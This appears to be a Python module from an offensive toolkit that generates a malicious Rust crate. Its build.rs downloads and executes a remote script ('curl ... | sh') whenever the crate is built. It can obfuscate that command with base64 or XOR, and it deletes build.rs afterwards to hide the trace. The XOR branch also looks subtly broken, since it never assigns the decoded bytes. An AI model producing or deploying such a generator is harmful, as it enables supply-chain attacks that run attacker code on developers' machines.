"""Rust crate payload generator."""
from __future__ import annotations

import base64
import random
from textwrap import dedent
from typing import Optional

from payloads.builder import PayloadBuilder

builder = PayloadBuilder()


def _encode(cmd: str, method: Optional[str]) -> str:
    if method == "b64":
        enc = base64.b64encode(cmd.encode()).decode()
        return f"let cmd = String::from_utf8(base64::decode(\"{enc}\").unwrap()).unwrap();"
    if method == "xor":
        key = random.randint(1, 255)
        enc = ",".join(str(ord(c) ^ key) for c in cmd)
        return (
            f"let mut b = vec![{enc}u8]; for v in &mut b {{ *v^{key}; }} let cmd = String::from_utf8(b).unwrap();"
        )
    return f"let cmd = \"{cmd}\".to_string();"


def generate(crate: str, callback: str, encode: Optional[str] = None, self_destruct: bool = True) -> str:
    """Return Cargo.toml and build.rs payload executing ``callback``."""

    encoded = _encode(f"curl -fsSL {callback} | sh", encode)
    build_rs = dedent(
        f"""
        fn main() {{
            {encoded}
            std::process::Command::new("sh").arg("-c").arg(&cmd).status().ok();
            if {str(self_destruct).lower()} {{ std::fs::remove_file("build.rs").ok(); }}
        }}
        """
    )

    cargo = builder.render(
        "rust_cargo.toml.j2",
        package_name=crate,
        version="0.0.1",
    )
    return cargo + "\n# build.rs\n" + build_rs
